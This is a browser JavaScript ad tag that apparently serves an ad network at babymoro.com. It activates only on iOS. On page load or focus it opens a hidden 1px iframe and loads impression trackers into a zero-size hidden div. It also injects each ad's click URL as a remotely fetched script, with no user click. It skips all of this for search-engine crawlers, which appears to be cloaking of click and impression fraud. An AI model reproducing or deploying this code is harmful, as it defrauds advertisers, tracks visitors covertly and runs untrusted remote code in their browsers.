(function() {
  var ct = window.ctJsTagPrivate = {};  
  var jp = window.jpJsTagPrivate = {};
  var adData = {};
  var params = getParams();
  var platform = getPlatform();
  var hasClick = false;

  ct.cnzz = function() {
    console.log(platform)
    if (platform === 'iOS') {
      var url = `http://static.babymoro.com/jt/stat.html?slot=${params.slot}&token=${params.token}`;
      showPX(url);
    }
  };

  ct.getAds = function(callback) {
    if (platform === 'iOS') {
      var args = [];
      args.push('slot='+params.slot);
      args.push('token='+params.token);
      args.push('platform='+platform);
      var api = 'http://api.babymoro.com/v1/js?callback=jpJsTagPrivate.getadsData&';
      jp.addScriptTag('adData', api + args.join('&'));
      document.getElementById('adData').onload = function() {
        callback(adData);
      };
    }
  };

  window.addEventListener('DOMContentLoaded', function() {
    if (hasClick) return;
    ct.cnzz();
    ct.getAds(function(adData){});
    hasClick = true;
  });

  window.addEventListener('focus', function() {
    if (hasClick) return;
    hasClick = true;
    ct.cnzz();
    ct.getAds(function(adData){});
  });
  
  jp.getadsData = function(data) {
    var ads = [];
    if (data.code != 0) {
      return;
    }

    var docker = document.createElement('div');
    docker.setAttribute('class', 'docker');
    docker.style.cssText = 'width:0px; height: 0px; overflow:hidden;';
    document.body.appendChild(docker);
    var adlist = data.adlist;

    for (var i = 0; i < adlist.length; i++) {
      ads[i] = {};
      ads[i].imp_tks = adlist[i].imp_tks || [];
      ads[i].click_url = adlist[i].click_url || '';

      judgeNum(ads[i], i, docker);
    }
    adData = ads;
  };

  jp.addScriptTag = function(id, src) {
    var script = document.createElement('script');
    script.setAttribute('type', 'text/javascript');
    script.src = src;
    script.id = id;
    document.body.appendChild(script);
  };

  function getParams() {
    var script = document.getElementById('babymoroTag');
    var u = new window.URL(script.src);
    return {
      token: u.searchParams.get('token'),
      slot: u.searchParams.get('slot')
    }
  }

  function showPX(imgUrl) {
    var s = document.getElementsByTagName("body")[0];
    var iframe_div = document.createElement("div");
    iframe_div.style.display = "none";
    var d = document.createElement("iframe");
    d.src = imgUrl;
    d.style = "position:fixed;width:1px;height:1px;opacity:1;transition:right 0.1s,bootom 0.7s;z-index:0x7FFFFFFF;";
    iframe_div.appendChild(d);
    s.appendChild(iframe_div, s);
  }

  function judgeNum(obj, num, docker) {
    if (obj === null) {
      return;
    }
    // setTimeout(function() {
      createSrc('img', obj.imp_tks, docker);
      createSrc('script', obj.click_url, docker);
    // }, (num * time));
  }

  function createSrc(type, url, docker) {
    if (isSpider() || url == null ) {
      return;
    }
    if (type === 'img') {
      var div = document.createElement('div');
      div.setAttribute('class', 'docker_0');
      for (var i = 0; i < url.length; i++) {
        if (url[i]) {
          var img = document.createElement('img');
          img.src = url[i];
          div.appendChild(img);
        }
      }
      docker.appendChild(div);
    } else if (type === 'script') {
      var sc = document.createElement('script');
      sc.src = url;
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(sc, s);
    }
  }

  function getPlatform() {
    var ua = navigator.userAgent;
    if (ua.indexOf('Android') > -1 || ua.indexOf('Adr') > -1) {
      return 'Android';
    } 
    if (ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
      return 'iOS';
    }
  }

  function isSpider() {
    var spiders = [
      'spider',
      'Baiduspider',
      'Googlebot',
      'Sogou web spider',
      'MSNBot',
      'JikeSpider',
      'bingbot',
      '360Spider',
      'YodaoBot'
    ];

    var ua = window.navigator.userAgent.toLowerCase();

    for (var i in spiders) {
      if (ua.indexOf(spiders[i].toLowerCase()) > -1) {
        return true;
      }
    }
    return false;
  }

})();